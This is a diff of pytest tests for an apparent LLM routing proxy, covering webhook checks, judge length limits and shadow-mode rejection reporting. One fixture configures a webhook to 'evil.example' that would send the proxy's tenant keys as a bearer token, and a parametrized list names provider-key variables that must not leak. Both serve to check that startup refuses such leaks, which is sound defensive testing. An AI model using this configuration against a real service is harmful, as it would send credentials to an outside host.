@@ -223,6 +223,67 @@ def test_a_webhook_check_cannot_be_shared_by_two_tenants_or_borrowed_from_anothe
     create_app(config(tenant_keys=TWO_TENANTS, route_policies=BOTH_CODE, checks=judged), ledger=Ledger())
 
 
+@pytest.mark.parametrize("variable", ["TINE_OPENAI_API_KEY", "TINE_ANTHROPIC_API_KEY", "TINE_TENANT_KEYS",
+                                      "tine_tenant_keys", "OPENAI_API_KEY", "ANTHROPIC_API_KEY", "anthropic_api_key"])
+def test_a_webhook_cannot_be_sent_the_proxys_own_secrets(variable):
+    """A check names the variable whose value it sends. Naming a provider key or the
+    tenant tokens would send them to whatever URL the check file holds."""
+    leaky = {"t": [{"type": "webhook", "url": "https://ci.example/check", "bearer_env": variable}]}
+    with pytest.raises(ValueError, match="bearer_env .* provider key"):
+        create_app(config(checks=leaky), ledger=Ledger())
+    with pytest.raises(ValueError, match="bearer_env"):
+        create_app(config(tenant_checks={"a": leaky}), ledger=Ledger())
+
+
+def test_a_webhook_token_is_sent_only_over_https():
+    plain = {"t": [{"type": "webhook", "url": "http://ci.example/check", "bearer_env": "CI_TOKEN"}]}
+    for url in ("http://ci.example/check", "http://127.0.0.1:9000/check", "http://localhost/check"):
+        with pytest.raises(ValueError, match="https"):
+            validate_checks({"t": [{**plain["t"][0], "url": url}]})
+    with pytest.raises(ValueError, match="https"):
+        create_app(config(checks=plain), ledger=Ledger())
+    # Without a token a plain http webhook stays allowed, as before.
+    create_app(config(checks={"t": [{"type": "webhook", "url": "http://127.0.0.1:9000/check"}]}), ledger=Ledger())
+    create_app(config(checks={"t": [{"type": "webhook", "url": "https://ci.example/check",
+                                     "bearer_env": "CI_TOKEN"}]}), ledger=Ledger())
+
+
+def test_one_token_variable_cannot_serve_the_webhooks_of_two_tenants():
+    def own(name, variable):
+        return {"tests+judge": [{"type": "webhook", "url": f"https://ci.{name}.example/check", "bearer_env": variable}]}
+    with pytest.raises(ValueError, match="'CI_TOKEN_A' is sent by the webhook checks of several tenants \\(a, b\\)"):
+        create_app(config(tenant_keys=TWO_TENANTS, route_policies=BOTH_CODE,
+                          tenant_checks={"a": own("a", "CI_TOKEN_A"), "b": own("b", "CI_TOKEN_A")}), ledger=Ledger())
+    # The same through a shared check that only tenant a's policy uses.
+    with pytest.raises(ValueError, match="'CI_TOKEN_A' is sent by the webhook checks of several tenants"):
+        create_app(config(tenant_keys=TWO_TENANTS, route_policies=BOTH_CODE, checks=own("shared", "CI_TOKEN_A"),
+                          tenant_checks={"b": own("b", "CI_TOKEN_A")}), ledger=Ledger())
+    # One tenant using its token in two checks, or in its own and a shared check, is fine.
+    two_checks = {**own("a", "CI_TOKEN_A"), "tests": own("a", "CI_TOKEN_A")["tests+judge"]}
+    create_app(config(tenant_keys=TWO_TENANTS, route_policies={"a": {"openai": CODE}},
+                      tenant_checks={"a": two_checks}), ledger=Ledger())
+    both = {**CODE, "stages": [{"models": ["coder"], "check": "tests"}, {"models": ["coder"], "check": "tests+judge"}]}
+    create_app(config(tenant_keys=TWO_TENANTS, route_policies={"a": {"openai": both}},
+                      checks={"tests": own("a", "CI_TOKEN_A")["tests+judge"]},
+                      tenant_checks={"a": own("a", "CI_TOKEN_A")}), ledger=Ledger())
+    # A shared check no policy names reaches no tenant's requests.
+    create_app(config(tenant_keys=TWO_TENANTS, route_policies={"b": {"openai": {**CODE, "tenant": "b"}}},
+                      checks={"unused": own("x", "CI_TOKEN_B")["tests+judge"]},
+                      tenant_checks={"b": own("b", "CI_TOKEN_B")}), ledger=Ledger())
+
+
+def test_a_tenant_check_file_naming_a_tine_variable_is_refused_at_startup(monkeypatch, tmp_path):
+    own = tmp_path / "tenant-checks.json"
+    own.write_text(json.dumps({"a": {"tests+judge": [{"type": "webhook", "url": "https://evil.example/check",
+                                                      "bearer_env": "TINE_TENANT_KEYS"}]}}), encoding="utf-8")
+    monkeypatch.setenv("TINE_TENANT_KEYS", '{"token-a": "a"}')
+    monkeypatch.setenv("TINE_TENANT_CHECKS", str(own))
+    for name in ("TINE_CHECKS", "TINE_SHADOW_POLICIES", "TINE_ROUTE_POLICIES"):
+        monkeypatch.delenv(name, raising=False)
+    with pytest.raises(ValueError, match="checks: Check 'tests\\+judge': bearer_env 'TINE_TENANT_KEYS'"):
+        ProxyConfig.from_env().validate()
+
+
 @pytest.mark.parametrize("cost", ["NaN", "Infinity", "-Infinity", "1e999", "1" + "0" * 400, "1e300"])
 @pytest.mark.parametrize("passed", ["true", "false"])
 def test_a_webhook_cost_that_cannot_be_added_up_is_unknown_and_never_fails_the_request(cost, passed):
@@ -370,21 +431,65 @@ def test_a_stalled_stage_gives_way_to_the_frontier_at_the_route_deadline():
 
 def test_the_judge_is_not_asked_about_text_it_would_only_see_part_of():
     """The judge reads at most 12,000 characters of request and 20,000 of answer. Longer
-    text would be cut without a word, so the judge is not asked and the answer is rejected."""
+    text would be cut without a word, so the judge is not asked and the answer is rejected.
+    A request too long is known before the cheap model answers, so its stage is skipped."""
     routed = config(route_policies={"a": {"openai": CODE}}, checks=CHECKS)
     long_request = {"model": "frontier", "messages": [
         {"role": "user", "content": "x" * 12001}, {"role": "assistant", "content": "ok"},
         {"role": "user", "content": "CURRENT-REQUEST: add the billing_id column"}]}
     seen = []
     response, row = ask(routed, world({"coder": "patch", "frontier": "frontier patch"}, seen), body=long_request)
-    assert seen == ["coder", "webhook", "frontier"] and response.json() == chat("frontier patch")
-    assert row["routing_cost_usd"] == pytest.approx(0.02)  # the coder and the tests; no judge call was paid
+    assert seen == ["frontier"] and response.json() == chat("frontier patch")
+    assert response.headers["x-tine-route"] == "frontier"
+    assert row["routing_cost_usd"] == 0.0  # neither the coder nor the tests were paid for
+    # At the limit nothing changes: the coder, the tests and the judge all run.
+    seen = []
+    ask(routed, world({"coder": "patch", "frontier": "frontier patch"}, seen),
+        body={"model": "frontier", "messages": [{"role": "user", "content": "x" * 12000}]})
+    assert seen == ["coder", "webhook", "judge"]
+    # A check with no judge step reads no request text, so its stage still runs.
+    webhook_only = {"tests+judge": [{"type": "webhook", "url": "https://ci.example/check"}]}
+    seen = []
+    ask(config(route_policies={"a": {"openai": CODE}}, checks=webhook_only),
+        world({"coder": "patch", "frontier": "frontier patch"}, seen), body=long_request)
+    assert seen == ["coder", "webhook"]
     seen = []
     ask(routed, world({"coder": "y" * 20001, "frontier": "frontier patch"}, seen))
     assert seen == ["coder", "webhook", "frontier"]
     seen = []
     ask(routed, world({"coder": "y" * 20000, "frontier": "frontier patch"}, seen))
     assert seen == ["coder", "webhook", "judge"]
+
+
+def test_shadow_mode_reports_why_the_judge_was_not_asked():
+    """A request or answer too long for the judge is a rejection with a reason, and the
+    shadow report counts it, so a pilot sees how much traffic the judge could not read."""
+    shadowed = config(shadow_policies={"a": {"openai": CODE}}, shadow_sample_rate=1.0, shadow_max_cost_usd=1.0,
+                      checks=CHECKS)
+
+    def run(answers, texts):
+        seen = []
+
+        async def scenario():
+            async with httpx.AsyncClient(transport=httpx.MockTransport(world(answers, seen))) as upstream:
+                app = create_app(shadowed, ledger=Ledger(), client=upstream)
+                async with httpx.AsyncClient(transport=httpx.ASGITransport(app), base_url="http://tine") as client:
+                    headers = {"authorization": "Bearer token-a"}
+                    for text in texts:
+                        await client.post("/v1/chat/completions", headers=headers, json={
+                            "model": "frontier", "messages": [{"role": "user", "content": text}]})
+                    return (await client.get("/v1/shadow", headers=headers)).json()
+        return seen, asyncio.run(scenario())
+    seen, report = run({"coder": "patch", "frontier": "frontier patch"}, ["x" * 12001, "q"])
+    assert seen == ["frontier", "frontier", "coder", "webhook", "judge"]  # the long request paid no cheap call
+    assert report["shadowed_requests"] == 2 and report["policy_would_accept"] == 1
+    assert report["check_rejection_reasons"] == {"request_too_long": 1}
+    assert report["shadow_spend_usd"] == pytest.approx(0.03)
+    seen, report = run({"coder": "y" * 20001, "frontier": "frontier patch"}, ["q"])
+    assert seen == ["frontier", "coder", "webhook"]
+    assert report["check_rejection_reasons"] == {"response_too_long": 1}
+    _, report = run({"coder": "patch", "frontier": "frontier patch"}, ["q"])
+    assert report["check_rejection_reasons"] == {}
 
 
 def test_untrusted_text_cannot_close_the_judges_frame_and_tests_are_claimed_only_when_they_ran():
